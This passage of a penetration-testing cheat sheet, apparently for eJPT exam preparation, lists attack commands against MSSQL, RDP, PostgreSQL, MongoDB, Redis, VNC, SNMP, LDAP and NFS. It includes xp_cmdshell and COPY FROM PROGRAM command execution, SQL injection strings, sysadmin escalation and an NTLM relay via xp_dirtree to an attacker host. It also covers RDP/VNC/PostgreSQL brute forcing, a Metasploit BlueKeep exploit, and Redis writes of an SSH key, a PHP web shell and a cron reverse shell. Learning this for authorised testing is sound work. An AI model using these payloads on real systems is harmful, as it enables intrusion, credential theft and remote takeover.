SELECT name FROM master..sysdatabases;      # List databases (alternative)
CREATE DATABASE dbname;                      # Create database
USE database_name;                          # Select database
DROP DATABASE dbname;                       # Delete database
SELECT DB_NAME();                           # Current database
SELECT name FROM sys.tables;                # List tables
SELECT name FROM sysobjects WHERE xtype='U';  # List tables (alternative)
go

# Table operations
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name='users';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT * FROM users;
SELECT TOP 10 * FROM users;                 # Limit results
go

# User and privilege information
SELECT name,password_hash FROM sys.sql_logins;
SELECT SYSTEM_USER;                         # Current user
SELECT USER_NAME();                         # Current user
SELECT IS_SRVROLEMEMBER('sysadmin');       # Check sysadmin role
SELECT name FROM sys.server_principals WHERE type='S';  # SQL logins
SELECT name FROM sys.server_principals WHERE type='U';  # Windows logins
go

# System information
SELECT @@SERVERNAME;                        # Server name
SELECT SERVERPROPERTY('MachineName');       # Machine name
SELECT SERVERPROPERTY('ServerName');        # Server name
SELECT SERVERPROPERTY('Edition');           # SQL Server edition
SELECT SERVERPROPERTY('ProductVersion');    # Product version
SELECT @@VERSION;                           # Version info
EXEC sp_helpdb;                            # Database information
EXEC sp_who;                               # Active connections
EXEC sp_helpuser;                          # User information
go

# Command execution (requires elevated privileges)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c "Get-Process"';
EXEC xp_cmdshell 'dir C:\';
go

# File operations
EXEC xp_fileexist 'C:\Windows\System32\cmd.exe';
EXEC xp_dirtree 'C:\', 1, 1;
BULK INSERT users FROM 'C:\temp\users.txt';
go

# Read file (using OpenRowset)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
go

# Write file
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
go

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\test.txt', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, 'Test content'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
go

# Linked servers
EXEC sp_linkedservers;                      # List linked servers
SELECT * FROM sys.servers;                  # List servers
EXEC ('SELECT @@VERSION') AT [LinkedServer];  # Execute on linked server
go

# Hash dumping
SELECT name, password_hash, type_desc FROM sys.sql_logins;
go
```

### 🔧 Advanced MSSQL Techniques
```bash
# MSSQL injection
' OR 1=1--
' OR '1'='1
admin'--
' UNION SELECT NULL,NULL,NULL--

# Extract data via error messages
' AND 1=CONVERT(INT,@@VERSION)--

# MSSQL stored procedures
EXEC sp_configure;
EXEC sp_password NULL, 'newpassword', 'sa';  # Change password
EXEC sp_addsrvrolemember 'username', 'sysadmin';  # Add sysadmin
EXEC sp_addlogin 'username', 'password';
go

# Relay attacks via xp_dirtree
EXEC xp_dirtree '\\<attacker_ip>\share';
# Then capture hash with Responder

# Responder (on attacker machine)
responder -I eth0 -wrf

# MSSQL impersonation
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT USER_NAME();
REVERT;
go

# Check impersonation permissions
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
go
```

---

## 📋 RDP (Port 3389)

### 🔍 Discovery & Enumeration
```bash
# Nmap RDP scanning
nmap -p 3389 -sV -sC <target_ip>
nmap -p 3389 --script rdp-* <target_ip>
nmap -p 3389 --script rdp-enum-encryption <target_ip>
nmap -p 3389 --script rdp-ntlm-info <target_ip>
nmap -p 3389 --script rdp-vuln-ms12-020 <target_ip>

# Check if RDP is open
nc -nv <target_ip> 3389
nmap -p 3389 --open <target_ip>
```

### 🔓 RDP Connection & Access
```bash
# rdesktop
rdesktop <target_ip>
rdesktop <target_ip>:3389
rdesktop -u username -p password <target_ip>
rdesktop -u username -p password -d domain <target_ip>
rdesktop -g 1024x768 <target_ip>  # Custom resolution
rdesktop -f <target_ip>  # Fullscreen
rdesktop -a 16 <target_ip>  # Color depth
rdesktop -r disk:share=/tmp <target_ip>  # Share local folder
rdesktop -r sound:local <target_ip>  # Enable sound
rdesktop -0 <target_ip>  # Console session
rdesktop -u username -p password <target_ip> -g 1920x1080 -x l  # LAN speed

# xfreerdp (recommended)
xfreerdp /v:<target_ip>
xfreerdp /u:username /p:password /v:<target_ip>
xfreerdp /u:username /p:password /d:domain /v:<target_ip>
xfreerdp /u:username /p:password /v:<target_ip> /cert-ignore
xfreerdp /u:username /p:password /v:<target_ip> /cert:ignore
xfreerdp /u:username /p:password /v:<target_ip> /size:1920x1080
xfreerdp /u:username /p:password /v:<target_ip> /f  # Fullscreen
xfreerdp /u:username /p:password /v:<target_ip> /drive:share,/tmp  # Share folder
xfreerdp /u:username /p:password /v:<target_ip> /clipboard
xfreerdp /u:username /p:password /v:<target_ip> +fonts +themes +wallpaper
xfreerdp /u:username /p:password /v:<target_ip> /network:lan
xfreerdp /u:username /pth:NTHASH /v:<target_ip>  # Pass-the-hash
xfreerdp /u:username /p:password /v:<target_ip> /port:3390  # Custom port

# FreeRDP with advanced options
xfreerdp /u:administrator /p:password /v:<target_ip> /cert-ignore /compression /auto-reconnect /dynamic-resolution

# Linux Remmina GUI client
remmina

# Windows RDP client (from Linux with wine)
wine mstsc.exe
```

### 🔓 RDP Brute Force
```bash
# Hydra RDP brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target_ip>
hydra -L users.txt -P passwords.txt rdp://<target_ip>
hydra -l admin -P passwords.txt rdp://<target_ip> -t 4
hydra -l administrator -P passwords.txt rdp://<target_ip> -V -f

# Ncrack RDP brute force
ncrack -p 3389 --user administrator -P /usr/share/wordlists/rockyou.txt <target_ip>

# Ncrack RDP brute force (continued)
ncrack -p 3389 -U users.txt -P passwords.txt <target_ip>
ncrack rdp://<target_ip> -u administrator -P passwords.txt

# Crowbar RDP brute force
crowbar -b rdp -s <target_ip>/32 -u administrator -C passwords.txt
crowbar -b rdp -s <target_ip>/32 -U users.txt -C passwords.txt -n 1

# Metasploit RDP modules
msfconsole

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target_ip>
run

use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target_ip>
run

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target_ip>
set LHOST <your_ip>
exploit

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target_ip>
set RPORT 3389
run
```

### 🔧 RDP Session Management
```bash
# List active RDP sessions (from Windows target)
qwinsta
query session
query user

# Disconnect RDP session
logoff <session_id>
rwinsta <session_id>

# Connect to specific session
mstsc /v:<target_ip> /console
mstsc /v:<target_ip> /admin
mstsc /v:<target_ip> /shadow:<session_id>

# Save RDP configuration
cmdkey /generic:<target_ip> /user:administrator /pass:password
```

### 🔧 RDP Tunneling & Port Forwarding
```bash
# SSH tunnel for RDP
ssh -L 3389:localhost:3389 user@<target_ip>
# Then connect locally
xfreerdp /v:localhost /u:username /p:password

# RDP through SSH jump host
ssh -L 3389:<internal_target_ip>:3389 user@<jump_host>
xfreerdp /v:localhost /u:username /p:password

# Proxychains with RDP
proxychains xfreerdp /v:<target_ip> /u:username /p:password
```

---

## 📋 PostgreSQL (Port 5432)

### 🔍 Discovery & Enumeration
```bash
# Nmap PostgreSQL scanning
nmap -p 5432 -sV -sC <target_ip>
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>

# Banner grabbing
nc -nv <target_ip> 5432
```

### 🔓 PostgreSQL Authentication & Access
```bash
# psql client
psql -h <target_ip> -U postgres
psql -h <target_ip> -U username -d database_name
psql -h <target_ip> -p 5432 -U postgres -W
psql postgresql://username:password@<target_ip>:5432/database_name

# Connection string
psql "host=<target_ip> port=5432 user=postgres password=password dbname=postgres"
```

### 🔓 PostgreSQL Brute Force
```bash
# Hydra PostgreSQL brute force
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<target_ip>
hydra -L users.txt -P passwords.txt postgres://<target_ip>

# Medusa PostgreSQL brute force
medusa -h <target_ip> -u postgres -P /usr/share/wordlists/rockyou.txt -M postgres

# Metasploit PostgreSQL modules
msfconsole

use auxiliary/scanner/postgres/postgres_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/postgres/postgres_login
set RHOSTS <target_ip>
set USERNAME postgres
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

use auxiliary/admin/postgres/postgres_sql
set RHOSTS <target_ip>
set USERNAME postgres
set PASSWORD password
set SQL "SELECT version();"
run

use auxiliary/admin/postgres/postgres_readfile
set RHOSTS <target_ip>
set USERNAME postgres
set PASSWORD password
set RFILE /etc/passwd
run
```

### 📊 PostgreSQL Commands
```bash
# Inside psql session

# List databases
\l
\list
SELECT datname FROM pg_database;

# Connect to database
\c database_name
\connect database_name

# List tables
\dt
\dt+
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

# Describe table
\d table_name
\d+ table_name

# List users/roles
\du
\du+
SELECT usename FROM pg_user;
SELECT rolname FROM pg_roles;

# Current user
SELECT current_user;
SELECT user;

# PostgreSQL version
SELECT version();

# Execute SQL
SELECT * FROM users;
SELECT * FROM pg_catalog.pg_tables;

# Command execution (if superuser)
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;

# Read file
CREATE TABLE file_read(content text);
COPY file_read FROM '/etc/passwd';
SELECT * FROM file_read;

# Write file
COPY (SELECT 'test content') TO '/tmp/test.txt';

# Exit
\q
exit
```

---

## 📋 MongoDB (Port 27017)

### 🔍 Discovery & Enumeration
```bash
# Nmap MongoDB scanning
nmap -p 27017 -sV -sC <target_ip>
nmap -p 27017 --script mongodb-* <target_ip>
nmap -p 27017 --script mongodb-brute <target_ip>
nmap -p 27017 --script mongodb-databases <target_ip>
nmap -p 27017 --script mongodb-info <target_ip>

# Banner grabbing
nc -nv <target_ip> 27017
```

### 🔓 MongoDB Authentication & Access
```bash
# mongo client
mongo <target_ip>
mongo <target_ip>:27017
mongo <target_ip>:27017/database_name
mongo "mongodb://<target_ip>:27017"
mongo "mongodb://username:password@<target_ip>:27017/database_name"
mongo --host <target_ip> --port 27017

# mongosh (newer versions)
mongosh <target_ip>
mongosh "mongodb://<target_ip>:27017"
mongosh "mongodb://username:password@<target_ip>:27017/database_name"
```

### 📊 MongoDB Commands
```bash
# Inside mongo/mongosh session

# List databases
show dbs
show databases

# Select database
use database_name

# List collections (tables)
show collections
show tables

# Query data
db.collection_name.find()
db.collection_name.find().pretty()
db.collection_name.find({field: "value"})
db.users.find()
db.users.find({username: "admin"})

# Count documents
db.collection_name.count()
db.collection_name.countDocuments()

# Get one document
db.collection_name.findOne()

# List users
db.getUsers()
show users

# Current database
db.getName()

# Server status
db.serverStatus()
db.version()

# Admin commands
use admin
db.runCommand({listDatabases: 1})

# Exit
exit
quit()
```

---

## 📋 Redis (Port 6379)

### 🔍 Discovery & Enumeration
```bash
# Nmap Redis scanning
nmap -p 6379 -sV -sC <target_ip>
nmap -p 6379 --script redis-* <target_ip>
nmap -p 6379 --script redis-info <target_ip>

# Banner grabbing
nc -nv <target_ip> 6379
```

### 🔓 Redis Authentication & Access
```bash
# redis-cli
redis-cli -h <target_ip>
redis-cli -h <target_ip> -p 6379
redis-cli -h <target_ip> -a password
redis-cli -h <target_ip> --no-auth-warning -a password

# Test connection
echo "PING" | nc -nv <target_ip> 6379
# Response: +PONG
```

### 📊 Redis Commands
```bash
# Inside redis-cli session

# Authentication
AUTH password

# Server information
INFO
INFO server
INFO keyspace
INFO replication
INFO stats
CONFIG GET *

# Database operations
SELECT 0                    # Select database 0
KEYS *                      # List all keys
GET key_name                # Get key value
SET key_name value          # Set key value
DEL key_name                # Delete key
FLUSHALL                    # Delete all keys (dangerous!)
FLUSHDB                     # Delete current database keys
DBSIZE                      # Number of keys

# Persistence
SAVE                        # Synchronous save
BGSAVE                      # Background save
LASTSAVE                    # Last save time

# Exploitation techniques
# Write SSH key
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET mykey "ssh-rsa AAAAB3... your_public_key"
SAVE

# Write web shell
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET mykey "<?php system($_GET['cmd']); ?>"
SAVE

# Write cron job
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET mykey "\n* * * * * /bin/bash -i >& /dev/tcp/<your_ip>/4444 0>&1\n"
SAVE

# Metasploit Redis modules
msfconsole

use auxiliary/scanner/redis/redis_server
set RHOSTS <target_ip>
run

use auxiliary/gather/redis_extractor
set RHOSTS <target_ip>
run
```

---

## 📋 VNC (Port 5900)

### 🔍 Discovery & Enumeration
```bash
# Nmap VNC scanning
nmap -p 5900 -sV -sC <target_ip>
nmap -p 5900-5910 -sV <target_ip>
nmap -p 5900 --script vnc-* <target_ip>
nmap -p 5900 --script vnc-info <target_ip>
nmap -p 5900 --script vnc-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 5900 --script realvnc-auth-bypass <target_ip>

# Banner grabbing
nc -nv <target_ip> 5900
```

### 🔓 VNC Connection & Access
```bash
# vncviewer
vncviewer <target_ip>
vncviewer <target_ip>:5900
vncviewer <target_ip>::5900
vncviewer <target_ip>:1  # Display :1 = Port 5901

# With password
vncviewer <target_ip> -passwd password
vncviewer <target_ip> -passwd vnc_password_file

# RealVNC viewer
xvnc <target_ip>:1
```

### 🔓 VNC Brute Force
```bash
# Hydra VNC brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://<target_ip>
hydra -P passwords.txt vnc://<target_ip> -s 5900

# Medusa VNC brute force
medusa -h <target_ip> -P /usr/share/wordlists/rockyou.txt -M vnc

# Metasploit VNC modules
msfconsole

use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target_ip>
run

use auxiliary/scanner/vnc/vnc_login
set RHOSTS <target_ip>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 🔧 VNC Password Cracking
```bash
# Crack VNC password file
vncpwd <vnc_password_file>

# Metasploit VNC password extraction
use post/windows/gather/credentials/vnc
use post/linux/gather/hashdump
```

---

## 📋 SNMP (Port 161 UDP)

### 🔍 Discovery & Enumeration
```bash
# Nmap SNMP scanning
nmap -sU -p 161 <target_ip>
nmap -sU -p 161 --script snmp-* <target_ip>
nmap -sU -p 161 --script snmp-brute <target_ip>
nmap -sU -p 161 --script snmp-info <target_ip>
nmap -sU -p 161 --script snmp-interfaces <target_ip>
nmap -sU -p 161 --script snmp-netstat <target_ip>
nmap -sU -p 161 --script snmp-processes <target_ip>
nmap -sU -p 161 --script snmp-sysdescr <target_ip>
nmap -sU -p 161 --script snmp-win32-services <target_ip>
nmap -sU -p 161 --script snmp-win32-users <target_ip>

# Check if SNMP is open
nc -nvu <target_ip> 161
```

### 🔍 SNMP Enumeration Tools
```bash
# snmpwalk - Walk SNMP tree
snmpwalk -v 2c -c public <target_ip>
snmpwalk -v 2c -c private <target_ip>
snmpwalk -v 2c -c public <target_ip> 1.3.6.1.2.1.1
snmpwalk -v 2c -c public <target_ip> system
snmpwalk -v 2c -c public <target_ip> hrSWInstalledName
snmpwalk -v 1 -c public <target_ip>
snmpwalk -v 3 -l authPriv -u snmpuser -a SHA -A authpass -x AES -X privpass <target_ip>

# snmpget - Get specific OID
snmpget -v 2c -c public <target_ip> 1.3.6.1.2.1.1.1.0
snmpget -v 2c -c public <target_ip> system.sysDescr.0
snmpget -v 2c -c public <target_ip> 1.3.6.1.2.1.1.5.0  # Hostname

# snmpbulkwalk - Bulk walk (faster)
snmpbulkwalk -v 2c -c public <target_ip>
snmpbulkwalk -v 2c -c public <target_ip> 1.3.6.1.2.1

# Common community strings
public
private
manager
community
snmp
secret
read
write

# onesixtyone - SNMP community string brute force
onesixtyone <target_ip>
onesixtyone -c community_strings.txt <target_ip>
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt <target_ip>

# snmp-check
snmp-check <target_ip>
snmp-check -c public <target_ip>
snmp-check -c public -v 2 <target_ip>

# snmpenum
snmpenum <target_ip> public linux.txt

# Metasploit SNMP modules
msfconsole

use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target_ip>
set PASS_FILE /usr/share/wordlists/metasploit/snmp_default_pass.txt
run

use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <target_ip>
set COMMUNITY public
run

use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS <target_ip>
set COMMUNITY public
run

use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS <target_ip>
set COMMUNITY public
run
```

### 📊 Important SNMP OIDs
```bash
# System information
1.3.6.1.2.1.1.1.0        # System description
1.3.6.1.2.1.1.2.0        # System object ID
1.3.6.1.2.1.1.3.0        # System uptime
1.3.6.1.2.1.1.4.0        # System contact
1.3.6.1.2.1.1.5.0        # System hostname
1.3.6.1.2.1.1.6.0        # System location

# Network interfaces
1.3.6.1.2.1.2.2.1.2      # Interface descriptions
1.3.6.1.2.1.2.2.1.6      # Interface MAC addresses

# User accounts
1.3.6.1.4.1.77.1.2.25    # Windows users

# Running processes
1.3.6.1.2.1.25.4.2.1.2   # Running processes
1.3.6.1.2.1.25.4.2.1.4   # Process path

# Installed software
1.3.6.1.2.1.25.6.3.1.2   # Installed software

# Storage information
1.3.6.1.2.1.25.2.3.1.3   # Storage units

# Network connections
1.3.6.1.2.1.6.13.1       # TCP connections
```

---

## 📋 LDAP (Port 389, 636)

### 🔍 Discovery & Enumeration
```bash
# Nmap LDAP scanning
nmap -p 389,636 -sV -sC <target_ip>
nmap -p 389 --script ldap-* <target_ip>
nmap -p 389 --script ldap-rootdse <target_ip>
nmap -p 389 --script ldap-search <target_ip>
nmap -p 389 --script ldap-brute <target_ip>

# ldapsearch - LDAP query
ldapsearch -x -h <target_ip> -s base
ldapsearch -x -h <target_ip> -s base namingcontexts
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com"
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=*)"
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=user)"
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=person)"
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "samaccountname=admin"

# LDAP with authentication
ldapsearch -x -h <target_ip> -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com"
ldapsearch -x -h <target_ip> -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectclass=*)"

# LDAPS (SSL)
ldapsearch -x -H ldaps://<target_ip>:636 -b "dc=domain,dc=com"

# Extract users
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=person)" sAMAccountName
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=user)" cn mail

# Extract groups
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectclass=group)" cn member

# windapsearch (Windows LDAP enumeration)
python3 windapsearch.py -d domain.com --dc-ip <target_ip> -U
python3 windapsearch.py -d domain.com --dc-ip <target_ip> -G
python3 windapsearch.py -d domain.com --dc-ip <target_ip> -C
python3 windapsearch.py -d domain.com --dc-ip <target_ip> --da  # Domain admins
```

---

## 📋 NFS (Port 2049)

### 🔍 Discovery & Enumeration
```bash
# Nmap NFS scanning
nmap -p 2049 -sV -sC <target_ip>
nmap -p 111,2049 --script nfs-* <target_ip>
nmap -p 111,2049 --script nfs-ls <target_ip>
nmap -p 111,2049 --script nfs-showmount <target_ip>
nmap -p 111,2049 --script nfs-statfs <target_ip>

# Show NFS exports
showmount -e <target_ip>
showmount -a <target_ip>  # All mount points
showmount -d <target_ip>  # Directories only

# rpcinfo
rpcinfo <target_ip>
rpcinfo -p <target_ip>

# nfsstat
nfsstat -m
```

### 🔧 NFS Mounting
```bash
# Mount NFS share
mount -t nfs <target_ip>:/share /mnt/nfs
mount -t nfs -o vers=3 <target_ip>:/share /mnt/nfs
mount -t nfs -o nolock <target_ip>:/share /mnt/nfs

# Mount with specific options
mount -t nfs -o rw,vers=3,nolock <target_ip>:/share /mnt/nfs

# Unmount
umount /mnt/nfs

# List mounted NFS shares
mount | grep nfs
df -h -t nfs
```

---

## 🎯 Quick Reference Summary

### 🔥 Most Important Commands by Protocol

**FTP (21):**
```bash
ftp <target_ip>
# anonymous:anonymous
hydra -l admin -P passwords.txt ftp://<target_ip>
```

**SSH (22):**
```bash
ssh user@<target_ip>
hydra -l root -P passwords.txt ssh://<target_ip>
scp file.txt user@<target_ip>:/path/
```

**SMTP (25):**
```bash
nc <target_ip> 25
VRFY root
smtp-user-enum -M VRFY -U users.txt -t <target_ip>
```

**DNS (53):**
```bash
dig axfr @<target_ip> domain.com
dnsrecon -d domain.com -t axfr
```

**HTTP/S (80/443):**
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
nikto -h http://<target_ip>
curl -I http://<target_ip>
```

**SMB (445):**
```bash
smbclient -L //<target_ip> -N
enum4linux -a <target_ip>
smbmap -H <target_ip>
```

**MySQL (3306):**
```bash
mysql -h <target_ip> -u root -p
hydra -l root -P passwords.txt mysql://<target_ip>
```

**RDP (3389):**
```bash
xfreerdp /u:administrator /p:password /v:<target_ip> /cert-ignore
hydra -l administrator -P passwords.txt rdp://<target_ip>
```

**MSSQL (1433):**
```bash
impacket-mssqlclient sa:password@<target_ip>
sqsh -S <target_ip> -U sa -P password
```

---

**🎓 eJPT Exam Tips:**
- **Always start with Nmap** for service identification
- **Try default credentials** before brute forcing
- **Document everything** - screenshots and command outputs
- **Use Metasploit modules** for automation
- **Enumerate thoroughly** before exploitation
- **Check for anonymous/guest access** first
- **Combine multiple tools** for best results
